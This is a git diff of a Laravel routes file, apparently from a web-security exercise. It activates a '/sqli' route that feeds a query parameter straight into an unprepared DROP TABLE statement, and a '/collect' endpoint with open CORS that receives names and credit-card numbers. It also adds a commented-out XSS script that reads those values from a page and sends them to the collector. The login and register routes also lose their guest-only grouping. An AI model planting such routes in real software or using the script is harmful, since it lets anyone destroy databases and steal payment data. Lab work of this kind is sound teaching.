@@ -133,10 +133,11 @@ Route::delete('/roles/delete/{role}', [RolesController::class, 'delete'])->name(
 
 // Public routes (guest only)
 // Route::middleware('guest')->group(function () {
-    Route::get('/login', [UsersController::class, 'login'])->name('login');
-    Route::post('/login', [UsersController::class, 'doLogin'])->name('do_login');
-    Route::get('/register', [UsersController::class, 'register'])->name('register');
-    Route::post('/register', [UsersController::class, 'doRegister'])->name('do_register');
+
+Route::get('/login', [UsersController::class, 'login'])->name('login');
+Route::post('/login', [UsersController::class, 'doLogin'])->name('do_login');
+Route::get('/register', [UsersController::class, 'register'])->name('register');
+Route::post('/register', [UsersController::class, 'doRegister'])->name('do_register');
 // });
 
 // Authenticated routes
@@ -206,19 +207,28 @@ Route::get('/auth/google',
 [UsersController::class, 'handleGoogleCallback']);
 
 
-// Route::get("/sqli", function(Request $request){
-//     $table = $request->query('table');
-//     DB::unprepared("DROP TABLE $table");
-//     return redirect('/');
-// });
+Route::get("/sqli", function(Request $request){
+    $table = $request->query('table');
+    DB::unprepared("DROP TABLE $table");
+    return redirect('/');
+});
 
 
-// Route::get("collect", function(Request $request){
-//     $name = $request->query('name');
-//     $credit = $request->query('credit');    
-//     return response('data collected', 200)
+Route::get("/collect", function(Request $request){
+    $name = $request->query('name');
+    $credit = $request->query('credit');    
+    return response('data collected', 200)
     
-//     ->header("Access-Control-Allow-Origin", '*')
-//     ->header("Access-Control-Allow-Methods", 'GET, POST, OPTIONS')
-//     ->header("Access-Control-Allow-Headers", 'Content-Type, X-Request-With');
-// });
+    ->header("Access-Control-Allow-Origin", '*')
+    ->header("Access-Control-Allow-Methods", 'GET, POST, OPTIONS')
+    ->header("Access-Control-Allow-Headers", 'Content-Type, X-Request-With');
+});
+
+// <script>
+//     let name = document.geyElementById('name').textContent;
+//     let credit = document.geyElementById('credit').textContent; 
+//     alert(name + credit);
+//     let xhr = new XMLHttpRequest();
+//     xhr.open('GET', `http://127.0.0.1:8000/collect?name=${encodeURIComponent(name)}&credit=${encodeURIComponent(credit)}`);
+//     xhr.send();
+// </script>
